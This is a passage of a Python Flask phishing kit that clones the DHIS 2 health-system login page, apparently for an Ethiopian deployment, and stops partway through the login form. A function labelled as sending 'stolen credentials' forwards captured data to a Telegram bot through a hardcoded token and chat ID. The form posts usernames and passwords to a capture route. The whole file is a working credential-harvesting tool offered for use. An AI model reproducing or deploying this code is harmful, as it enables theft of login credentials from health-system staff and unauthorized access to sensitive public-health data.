import requests
from flask import Flask, request, render_template_string
import datetime

# === TELEGRAM CONFIG ===
TELEGRAM_BOT_TOKEN = '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw'
TELEGRAM_CHAT_ID = '7586408670'
# ========================

app = Flask(__name__)

def send_to_telegram(text):
    """Sends stolen credentials to your Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    try:
        response = requests.post(url, json=payload)
        print(f"Telegram Send Status: {response.status_code}")
        if response.status_code != 200:
            print(f"Telegram Error Body: {response.text}")
    except Exception as e:
        print(f"Exception while sending to Telegram: {e}")

# The HTML template with embedded CSS to ensure a perfect look
HTML_TEMPLATE = """
<!DOCTYPE HTML>
<html class="loginPage" dir="ltr">
<head>
<title>DHIS 2</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- 
    OPTION: If you want to try your downloaded CSS, uncomment these lines.
    However, the inline <style> below is robust and will fix layout issues.
    
    <link rel="stylesheet" type="text/css" href="/static/css/login.css">
    <link rel="stylesheet" type="text/css" href="/static/css/widgets.css">
-->

<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>

<style>
    /* --- RESET & BASE --- */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #f5f5f5;
        color: #333;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    /* --- HEADER (FLAG & TITLE) --- */
    .header-section {
        width: 100%;
        background-color: #fff;
        border-bottom: 1px solid #e0e0e0;
        padding: 15px 0;
        text-align: center;
    }
    #flagArea {
        height: 35px;
        width: auto;
        margin-bottom: 10px;
        display: block;
        margin-left: auto;
        margin-right: auto;
    }
    #titleArea {
        font-size: 24px;
        font-weight: bold;
        color: #0066cc;
        display: block;
    }

    /* --- MAIN CONTENT AREA --- */
    #loginField {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }
    #loginArea {
        background-color: #fff;
        width: 100%;
        max-width: 450px;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    
    /* --- LOGO AREA --- */
    #bannerArea {
        text-align: center;
        margin-bottom: 25px;
    }
    #bannerArea img {
        height: 50px;
        width: auto;
    }
    /* Fallback if image fails to load */
    #textLogoFallback {
        display: none; /* Hidden by default */
        font-size: 32px;
        font-weight: 800;
        color: #0066cc;
        letter-spacing: -1px;
    }

    /* --- FORM STYLES --- */
    #signInLabel {
        font-size: 18px;
        font-weight: 600;
        margin-bottom: 20px;
        color: #2c3e50;
    }
    .form-group {
        margin-bottom: 15px;
    }
    .form-group input {
        width: 100%;
        padding: 12px 15px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 14px;
        transition: border-color 0.2s;
    }
    .form-group input:focus {
        border-color: #0066cc;
        outline: none;
        box-shadow: 0 0 5px rgba(0,102,204,0.2);
    }
    
    /* --- BUTTON --- */
    #submitDiv {
        margin-top: 25px;
    }
    .button {
        width: 100%;
        padding: 12px;
        background-color: #0066cc;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    .button:hover {
        background-color: #004499;
    }

    /* --- FOOTER --- */
    #footerArea {
        background-color: #fff;
        border-top: 1px solid #e0e0e0;
        padding: 15px;
        text-align: center;
        font-size: 12px;
        color: #777;
    }
    #footerArea a {
        color: #0066cc;
        text-decoration: none;
    }
    #footerArea a:hover {
        text-decoration: underline;
    }
</style>
</head>
<body class="loginPage">

<div class="header-section">
    <!-- 
        If you have the flag at /static/images/ethiopia.png, this will load. 
        If not, it will be invisible, which is fine.
    -->
    <img id="flagArea" src="/static/images/ethiopia.png" alt="Ethiopia Flag" onerror="this.style.display='none';">
    <span id="titleArea">DHIS 2</span>
</div>

<div id="loginField">
    <div id="loginArea">
        <div id="bannerArea">
            <!-- 
                Attempts to load your logo. If it fails (404), the JS below 
                will hide the broken image and show the text "DHIS 2" instead.
            -->
            <img id="mainLogo" src="/static/images/logo_front.png" alt="DHIS2 Logo">
            <div id="textLogoFallback">DHIS 2</div>
        </div>

        <form id="loginForm" action="/capture" method="post">
            <div id="signInLabel">Sign in</div>
            <div class="form-group">
                <input type="text" id="j_username" name="j_username" placeholder="Username" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" id="j_password" name="j_password" autocomplete="off" placeholder="Password" required>
            </div>
            <div id="submitDiv">
                <input id="submit" class
